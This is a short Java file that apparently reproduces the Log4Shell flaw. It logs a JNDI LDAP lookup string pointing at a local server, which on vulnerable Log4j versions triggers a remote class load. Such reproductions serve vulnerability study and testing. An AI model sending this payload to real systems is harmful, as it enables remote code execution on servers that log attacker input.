package com.xy.server;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Server{
   public static final Logger logger = LogManager.getLogger(Server.class);

   public static void main(String[] args) {
       logger.error("${jndi:ldap://localhost:9999/Demo}");
   }
}